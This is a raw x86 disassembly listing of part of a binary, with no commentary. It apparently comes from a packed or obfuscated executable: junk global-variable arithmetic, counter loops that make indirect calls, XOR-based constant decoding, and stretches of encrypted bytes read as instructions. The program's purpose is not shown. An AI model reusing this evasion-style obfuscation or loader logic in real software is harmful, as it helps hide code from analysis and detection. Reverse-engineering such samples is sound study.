  408abb:	call   DWORD PTR ds:0x42eb2c
  408ac1:	mov    ecx,DWORD PTR ds:0x42e7ea
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e7ea,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e7e6,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x430542,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	cmp    ebp,DWORD PTR [eax-0x2d5a9b0c]
  408b18:	jle    0x408b98
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408af5
  408b1f:	retf   0x947b
  408b22:	gs enter 0x4097,0x9c
  408b27:	pushf  
  408b28:	pop    esi
  408b29:	mov    eax,0x452106a8
  408b2e:	(bad)  
  408b2f:	jo     0x408b4f
  408b31:	daa    
  408b32:	neg    DWORD PTR [edx+0x75]
  408b35:	retf   0x113d
  408b38:	or     BYTE PTR [esi-0x34327b36],bh
  408b3e:	frstor [ecx+0x20]
  408b41:	xor    eax,0xe25b798f
  408b46:	jbe    0x408af6
  408b48:	mov    dh,BYTE PTR [edi]
  408b4a:	sbb    al,0x78
  408b4c:	inc    edi
  408b4d:	adc    DWORD PTR [esi+0x616d8561],ebp
  408b53:	repz xchg edx,eax
  408b55:	into   
  408b56:	out    0x34,al
  408b58:	cdq    
  408b59:	clc    
  408b5a:	or     edi,DWORD PTR ds:0xbbae71bd
  408b60:	jg     0x408af8
  408b62:	icebp  
  408b63:	jle    0x408b94
  408b65:	enter  0xb9e4,0x5e
  408b69:	dec    ebp
  408b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b6b:	xor    cl,BYTE PTR [eax-0x2f]
  408b6e:	inc    DWORD PTR [edi+eiz*2]
  408b71:	xchg   edi,eax
  408b72:	call   0x92b2:0x20b7e010
  408b79:	pop    esp
  408b7a:	ja     0x408b53
  408b7c:	mov    al,0xc2
  408b7e:	out    dx,al
  408b7f:	inc    edi
  408b80:	push   es
  408b81:	cmp    ecx,edx
  408b83:	adc    bl,BYTE PTR ds:0xcee79abd
  408b89:	mov    al,bh
  408b8b:	pusha  
  408b8c:	cld    
  408b8d:	mov    ebx,0xee96e47b
  408b92:	retf   0xdff9
  408b95:	add    bl,BYTE PTR [edx]
  408b97:	out    0x23,eax
  408b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b9a:	inc    esi
  408b9b:	inc    esp
  408b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9d:	adc    DWORD PTR [edi-0xb69bb5c],ebx
  408ba3:	rol    BYTE PTR [edi-0x2],1
  408ba6:	iret   
  408ba7:	add    al,0x2e
  408ba9:	sbb    al,0x67
  408bab:	loope  0x408b68
  408bad:	jo     0x408c00
  408baf:	rcr    DWORD PTR [edx],1
  408bb1:	jbe    0x408b4d
  408bb3:	fucomip st,st(1)
  408bb5:	sub    bl,BYTE PTR [ecx]
  408bb7:	sub    eax,DWORD PTR [ebx-0x28]
  408bba:	add    bh,BYTE PTR [ebp-0x2657999e]
  408bc0:	xchg   BYTE PTR [edi],cl
  408bc2:	xor    eax,0x82de0c86
  408bc7:	sbb    ebx,DWORD PTR [edx]
  408bc9:	mov    bh,0xa2
  408bcb:	addr16 iret 
  408bcd:	pop    edi
  408bce:	inc    ecx
  408bcf:	in     eax,0xfe
  408bd1:	mov    dl,0xd8
  408bd4:	xchg   edi,eax
  408bd5:	or     DWORD PTR [edx-0x4e85e1a0],ebp
  408bdb:	jg     0x408b94
  408bdd:	shl    edi,cl
  408bdf:	inc    edx
  408be0:	cmp    eax,0xf6c1c045
  408be5:	adc    DWORD PTR [edx],edx
  408be7:	and    BYTE PTR [eax+0x45],bl
  408bea:	inc    esi
  408beb:	fsubr  DWORD PTR [ecx+0x395672b5]
  408bf1:	pop    ebx
  408bf2:	fild   QWORD PTR [ebx+0x32]
  408bf5:	in     al,0xa6
  408bf7:	outs   dx,DWORD PTR ds:[esi]
  408bf8:	or     ah,BYTE PTR [ecx+0x1234a708]
  408bfe:	add    BYTE PTR [esi],ch
  408c00:	cmp    al,0xb0
  408c02:	xor    BYTE PTR [eax-0x78],ah
  408c05:	and    eax,0xf9fd692b
  408c0a:	add    al,0x0
  408c0c:	fst    st(0)
  408c0f:	lock xchg DWORD PTR [ecx-0xf08f823],esp
  408c16:	jmp    0xb2d6882d
  408c1b:	ja     0x408bdb
  408c1d:	xchg   edi,eax
  408c1e:	leave  
  408c1f:	das    
  408c20:	inc    ebx
  408c21:	stos   DWORD PTR es:[edi],eax
  408c22:	repz push es
  408c24:	scas   al,BYTE PTR es:[edi]
  408c25:	inc    edi
  408c26:	or     al,0xa5
  408c28:	scas   al,BYTE PTR es:[edi]
  408c29:	push   eax
  408c2a:	xchg   ecx,eax
  408c2b:	dec    ebp
  408c2c:	(bad)  
  408c2d:	and    cl,BYTE PTR [ebx]
  408c2f:	dec    eax
  408c31:	xor    BYTE PTR [edx],0x3e
  408c34:	mov    edx,0x66546d
  408c39:	fidiv  DWORD PTR [edx-0x10705281]
  408c3f:	adc    dl,ch
  408c41:	jg     0x408bea
  408c43:	xchg   esi,eax
  408c44:	enter  0xac9,0x81
  408c48:	int3   
  408c49:	fisttp QWORD PTR [ecx-0x56864d96]
  408c4f:	and    esi,DWORD PTR [ebx+0xb552ad4]
  408c55:	(bad)  
  408c56:	rcl    BYTE PTR [eax],1
  408c58:	out    0x49,al
  408c5a:	jle    0x408c90
  408c5c:	and    al,BYTE PTR gs:[edx]
  408c5f:	push   ds
  408c60:	jno    0x408c2c
  408c62:	dec    ebx
  408c63:	jbe    0x408c30
  408c65:	ret    0x9b3a
  408c68:	sbb    ecx,DWORD PTR [ebp-0x40]
  408c6b:	shl    BYTE PTR [ebp+0x6890b04e],1
  408c71:	cld    
  408c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c73:	xor    ebp,DWORD PTR [edi+0x658d8a7a]
  408c79:	sahf   
  408c7a:	sbb    esi,DWORD PTR [ecx]
  408c7c:	cmp    BYTE PTR [edx],al
  408c7e:	inc    eax
  408c7f:	mov    eax,ds:0x4e8e0560
  408c84:	sbb    al,0x67
  408c86:	push   edx
  408c87:	push   es
  408c88:	enter  0x1b5d,0x96
  408c8c:	sub    BYTE PTR [ebx+0x3977ec32],0x78
  408c93:	jl     0x408cbd
  408c95:	and    eax,0x9e72fbb7
  408c9a:	sti    
  408c9b:	fisttp WORD PTR [eax]
  408c9d:	mov    bh,0x55
  408c9f:	sbb    al,0x66
  408ca1:	and    DWORD PTR [ebx-0x48],ebx
  408ca4:	aam    0xb8
  408ca6:	stos   DWORD PTR es:[edi],eax
  408ca7:	xchg   ebx,eax
  408ca8:	std    
  408ca9:	in     al,dx
  408caa:	xor    bh,0xab
  408cad:	mov    cl,0x70
  408caf:	nop
  408cb0:	(bad)  
  408cb1:	sbb    BYTE PTR [edi+0x7c],cl
  408cb4:	xchg   ebx,eax
  408cb5:	sub    eax,0x3435c885
  408cba:	push   0x44bdb92d
  408cbf:	dec    ecx
  408cc0:	pusha  
  408cc1:	fld    DWORD PTR ds:0x11242e42
  408cc7:	xchg   esi,eax
  408cc8:	hlt    
  408cc9:	in     eax,dx
  408cca:	adc    cl,BYTE PTR [edx-0x408d90f3]
  408cd0:	loopne 0x408d2b
  408cd2:	xchg   ecx,eax
  408cd3:	lods   eax,DWORD PTR ds:[esi]
  408cd4:	shl    esp,0x24
  408cd7:	inc    edx
  408cd8:	mov    bl,0x3f
  408cda:	inc    ebx
  408cdb:	add    eax,0xa9d78fe7
  408ce0:	lods   eax,DWORD PTR ds:[esi]
  408ce1:	jmp    0x408cda
  408ce3:	jp     0x408cc0
  408ce5:	ficomp DWORD PTR [esp+ebp*1]
  408ce8:	jo     0x408c70
  408cea:	pop    ecx
  408ceb:	and    al,BYTE PTR [edi-0x37557bec]
  408cf1:	xchg   esp,eax
  408cf2:	xchg   edi,eax
  408cf3:	inc    ebx
  408cf4:	arpl   WORD PTR ds:0x32729d,ax
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x4305f6
  408d02:	mov    eax,ds:0x430612
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	mov    dl,0x87
  408d56:	jbe    0x408d98
  408d58:	mov    esp,ss
  408d5a:	jle    0x408dda
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408dc5
  408d61:	out    dx,al
  408d62:	inc    esi
  408d63:	pop    esi
  408d64:	cmc    
  408d65:	loope  0x408cfa
  408d67:	push   ss
  408d68:	inc    eax
  408d69:	push   ebx
  408d6a:	loope  0x408cf0
  408d6c:	rol    ah,0xb2
  408d6f:	popa   
  408d70:	add    eax,0x467bfeb
  408d75:	mov    edx,0xe1894af3
  408d7a:	fstp   DWORD PTR [edx-0x66]
  408d7d:	in     eax,0xb5
  408d7f:	push   edi
  408d80:	xchg   ebp,eax
  408d81:	icebp  
  408d82:	lods   eax,DWORD PTR ds:[esi]
  408d83:	add    BYTE PTR [edi],ah
  408d85:	sub    DWORD PTR [ebx+0x3cbbc65d],0x4b27669b
  408d8f:	cmovno esi,DWORD PTR [edx]
  408d92:	cwde   
  408d93:	int3   
  408d94:	call   FWORD PTR [ebx]
  408d96:	push   ss
  408d97:	fistp  DWORD PTR [edi+0x1d]
  408d9a:	aam    0x3
  408d9c:	clc    
  408d9d:	mov    cl,0xc4
  408d9f:	lea    ebx,[esi+esi*1+0x6ad7b496]
  408da6:	ja     0x408df3
  408da8:	mov    ecx,0xc772e669
  408dad:	sbb    eax,0x28193551
  408db2:	push   eax
  408db3:	mov    ch,0xe2
  408db5:	mov    dh,ch
  408db7:	sub    eax,0xeba012a3
  408dbc:	ja     0x408deb
  408dbe:	dec    DWORD PTR [edi]
  408dc0:	push   cs
  408dc1:	mov    ch,0xd3
  408dc3:	out    dx,al
  408dc4:	dec    esi
  408dc5:	aad    0xf8
  408dc7:	dec    esp
  408dc8:	add    BYTE PTR [edx-0x5f],bl
  408dcb:	add    ecx,eax
  408dcd:	cmp    DWORD PTR [esp+edi*8],ebp
  408dd0:	xchg   esi,eax
  408dd1:	adc    BYTE PTR [edx+0x64],dl
  408dd4:	or     al,0xd2
  408dd6:	cmp    al,0x30
  408dd8:	or     ecx,DWORD PTR [esp+ebp*2]
  408ddb:	sub    eax,0x4571d2fc
  408de0:	dec    ebx
  408de1:	ret    0xbd32
  408de4:	xchg   edi,eax
  408de5:	daa    
  408de6:	dec    esi
  408de7:	push   0x7d
  408de9:	mov    ebp,0x34cb0d61
  408dee:	(bad)  
  408def:	adc    esi,DWORD PTR [ecx]
  408df1:	addr16 cdq 
  408df3:	jo     0x408e37
  408df5:	jnp    0x408e47
  408df7:	push   0xf6b49efd
  408dfc:	add    ch,BYTE PTR [eax-0x5d]
  408dff:	ss jbe 0x408dea
  408e02:	lods   eax,DWORD PTR ds:[esi]
  408e03:	(bad)  
  408e04:	gs xchg bh,ah
  408e07:	jo     0x408d89
  408e09:	clc    
  408e0a:	clc    
  408e0b:	cmp    BYTE PTR [ecx-0x49],0x53
  408e0f:	es fwait
  408e11:	aaa    
  408e12:	js     0x408dfd
  408e14:	rcr    DWORD PTR [edi+edi*8+0x20],cl
  408e18:	and    al,0xa7
  408e1a:	jmp    0xb9a91d8c
  408e1f:	fsubr  DWORD PTR [ebp+0x17165fa8]
  408e25:	push   esp
  408e26:	mov    cl,BYTE PTR [ecx+ebp*1]
  408e29:	test   bl,bh
  408e2b:	aas    
  408e2c:	lea    ecx,[ecx+0x2bb4dac]
  408e32:	or     ecx,ecx
  408e34:	(bad)  
  408e35:	test   eax,0x87684791
  408e3a:	mov    edi,0x957f3987
  408e3f:	test   eax,0x2b48a53d
  408e44:	ret    0x4e52
  408e47:	repnz out dx,al
  408e49:	and    BYTE PTR [ebx],ah
  408e4b:	add    al,0x9e
  408e4d:	jbe    0x408ec6
  408e4f:	dec    esi
  408e50:	mov    esi,0xcfef8d4d
  408e55:	mov    ds:0x82637f43,al
  408e5a:	sbb    BYTE PTR [ecx-0x7ebad6eb],0x6f
  408e61:	pop    ss
  408e62:	daa    
  408e63:	pop    es
  408e64:	shl    edi,0x53
  408e67:	stc    
  408e68:	fstp   TBYTE PTR [edx-0xb]
  408e6b:	icebp  
  408e6c:	adc    al,BYTE PTR [eax+0x907d7cc]
  408e72:	fst    QWORD PTR [edi+0x3f]
  408e75:	xor    esi,DWORD PTR [edi+0x15]
  408e78:	hlt    
  408e79:	mov    bl,0x95
  408e7b:	mov    esi,0x3b51f6bf
  408e80:	push   0xf3ed11a2
  408e85:	mov    ebx,0x99fa2f73
  408e8a:	xor    cl,dl
  408e8c:	pop    edi
  408e8d:	dec    esp
  408e8e:	imul   eax,DWORD PTR [ebp-0x5b731a50],0xc1cb1c08
  408e98:	retf   0x527d
  408e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9c:	std    
  408e9d:	xchg   esp,eax
  408e9e:	iret   
  408e9f:	outs   dx,BYTE PTR ds:[esi]
  408ea0:	sub    edi,DWORD PTR [eax]
  408ea2:	inc    eax
  408ea3:	cdq    
  408ea4:	pop    ebp
  408ea5:	scas   al,BYTE PTR es:[di]
  408ea7:	js     0x408f1c
  408ea9:	retf   
  408eaa:	jmp    0xd0a6:0xdc51a36b
  408eb1:	fbld   TBYTE PTR [eax-0x276f8c04]
  408eb7:	das    
  408eb8:	sbb    DWORD PTR [ecx+0x6f],esp
  408ebb:	pop    edi
  408ebc:	mov    al,fs:0x98ba6d0d
  408ec2:	jae    0x408e8b
  408ec4:	out    dx,eax
  408ec5:	sbb    eax,0x7faffc17
  408eca:	lea    ebx,[esi+edx*1]
  408ecd:	dec    esp
  408ece:	jg     0x408eed
  408ed0:	inc    edx
  408ed1:	jb     0x408ebb
  408ed3:	shl    BYTE PTR [ebx],1
  408ed5:	adc    BYTE PTR [esp+ebp*1],bl
  408ed8:	xchg   ebp,eax
  408ed9:	dec    edi
  408eda:	mov    esp,0xb9248f27
  408edf:	jo     0x408ed7
  408ee1:	das    
  408ee2:	outs   dx,DWORD PTR ds:[esi]
  408ee3:	cmp    BYTE PTR [esi-0x69],0xe
  408ee7:	xchg   BYTE PTR ss:[ebx],al
  408eea:	ja     0x408f37
  408eec:	sub    ebx,DWORD PTR [eax+0x5d8ce1a2]
  408ef2:	test   bh,0xd2
  408ef5:	cmp    BYTE PTR [edi+ebp*4],ch
  408ef8:	cwde   
  408ef9:	ret    0x6650
  408efc:	inc    eax
  408efd:	mov    cl,0x44
  408eff:	daa    
  408f00:	jmp    0xa936:0xaab12965
  408f07:	loopne 0x408ed9
  408f09:	push   es
  408f0a:	xchg   esp,eax
  408f0b:	scas   al,BYTE PTR es:[edi]
  408f0c:	adc    edx,DWORD PTR [ebx+0x6f]
  408f0f:	fstp   DWORD PTR [eax+0x3b]
  408f12:	sahf   
  408f13:	iret   
  408f14:	iret   
  408f15:	fcomi  st,st(3)
  408f17:	fwait
  408f18:	test   ecx,eax
  408f1a:	das    
  408f1b:	pop    esi
  408f1c:	rol    bl,0x60
  408f1f:	inc    edi
  408f20:	and    esp,DWORD PTR [ecx-0x3d3485e5]
  408f26:	xor    esi,ebx
  408f28:	sub    BYTE PTR [ebp-0x8],al
  408f2b:	adc    al,0x6
  408f2d:	add    esi,DWORD PTR [ebp+0x26f0f5ed]
  408f33:	hlt    
  408f34:	loope  0x408fae
  408f36:	mov    esp,0x9d05c133
  408f3b:	jb     0x408f6f
  408f3d:	add    cl,cl
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee88,0x42e7ea
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x4305c6,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42eea8,0x42e7e6
  408f71:	call   DWORD PTR ds:0x42eacc
  408f77:	sbb    DWORD PTR ds:0x42e7e2,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x43052e,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x430532,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb84
  408faf:	sbb    DWORD PTR ds:0x4305d2,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e7da,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x430542,0x42ee88
  408fe0:	call   DWORD PTR ds:0x42ec00
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42eea4,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ebc4
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x4305da,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee94,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e7e2,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42eabc
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x43052a
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42eea4,0x43051a
  409056:	call   DWORD PTR ds:0x42eb5c
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e7e2,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e7e2
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e7e2,ebx
  40907e:	cmp    DWORD PTR ds:0x42e7e2,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ec2c
  409097:	cmp    DWORD PTR ds:0x42e7e2,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee94
  4090aa:	and    DWORD PTR ds:0x42eea0,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43050e
  4090bc:	sbb    edx,DWORD PTR ds:0x4305ce
  4090c2:	mov    DWORD PTR ds:0x43050e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43051e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43051e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43051e,edx
  4090e2:	cmp    DWORD PTR ds:0x43051e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e7fa
  4090f9:	push   0x42e92d
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ec30
  409109:	cmp    DWORD PTR ds:0x43051e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e7e6,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e7e6
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e7e6,edx
  40912d:	cmp    DWORD PTR ds:0x42e7e6,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eb30
  40914a:	cmp    DWORD PTR ds:0x42e7e6,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43051a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43050a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43050a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43050a,esi
  40917b:	cmp    DWORD PTR ds:0x43050a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e8fb
  40918d:	push   0x42e7fa
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eb48
  40919d:	cmp    DWORD PTR ds:0x43050a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43050a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43050a,esi
  4091b7:	cmp    DWORD PTR ds:0x43050a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee9c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x4305ce,0x430522
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x4305ce
  4091fe:	adc    DWORD PTR ds:0x42ee98,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43050e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43050e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43050e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43051e,0x43053a
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x43052e,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x430562
  409277:	mov    eax,ds:0x42ea1c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e7ee,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x43052a
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x43053a
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x430532
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x4305d6,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42eea0,0x10
  4092e1:	cmp    DWORD PTR ds:0x42eea0,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42eea0,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eb4c
  409310:	mov    edi,DWORD PTR ds:0x42eea0
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42eea0,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee94,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e7f6,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e7f2
  40934d:	adc    edx,DWORD PTR ds:0x430542
  409353:	mov    DWORD PTR ds:0x42e7f2,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42eeac,0x0
  409369:	mov    edi,DWORD PTR ds:0x42eeac
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42eeac,edi
  409376:	cmp    DWORD PTR ds:0x42eeac,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e7e6
  40938b:	call   DWORD PTR ds:0x42ec34
  409391:	cmp    DWORD PTR ds:0x42eeac,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42eeac
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42eeac,edi
  4093ad:	cmp    DWORD PTR ds:0x42eeac,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x430532,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42eea8,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42eea8
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42eea8,edi
  4093e2:	cmp    DWORD PTR ds:0x42eea8,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42eea8,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42eb50
  409402:	cmp    DWORD PTR ds:0x42eea8,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42eea8
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42eea8,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee8c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee8c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee8c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eb34
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee8c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee8c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x4305da
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43050a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43051e
  409480:	adc    edi,DWORD PTR ds:0x42ee98
  409486:	mov    DWORD PTR ds:0x43051e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42eeb0,0x42e7ea
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42eea0,0x43053a
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x430542
  4094b1:	and    DWORD PTR ds:0x43053e,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e7f6,0x43051a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x430526
